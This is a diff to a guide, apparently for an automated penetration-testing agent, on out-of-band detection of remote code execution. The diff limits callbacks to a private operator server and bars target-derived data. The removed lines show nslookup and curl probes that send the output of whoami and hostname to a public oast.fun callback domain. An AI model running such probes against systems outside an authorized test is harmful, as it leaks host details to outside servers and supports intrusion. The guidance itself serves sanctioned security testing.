@@ -41,18 +41,26 @@ Remote code execution leads to full server control when input reaches code execu
 
 ### OAST
 
-Use `interactsh-client -v` in the sandbox to mint a unique callback
-domain (`*.oast.fun`); substitute it for `attacker.tld` below. Each
-invocation prints inbound DNS/HTTP hits to stdout in real time.
+Only use OAST when the operator configured a private callback server
+(`$STRIX_OAST_SERVER` is set in the sandbox). Never use interactsh's public
+default servers (`oast.fun`, `oast.pro`, `oast.live`, ...): callbacks from the
+client's systems would land on a third-party server. If it is unset, use
+timing or output-based oracles instead.
+
+Start the client against that server with
+`interactsh-client -server "$STRIX_OAST_SERVER" ${STRIX_OAST_TOKEN:+-token "$STRIX_OAST_TOKEN"} -v`; it mints a unique callback domain and prints inbound DNS/HTTP hits
+to stdout. Substitute that domain for `attacker.tld` below. Put only a
+constant per-test canary label in the callback, never target-derived data
+such as hostnames, usernames or file contents.
 
 **DNS**
 ```bash
-nslookup $(whoami).xyz.oast.fun
+nslookup strix-rce-01.<callback-domain>
 ```
 
 **HTTP**
 ```bash
-curl https://xyz.oast.fun/$(hostname)
+curl https://<callback-domain>/strix-rce-01
 ```
 
 ### Output-Based
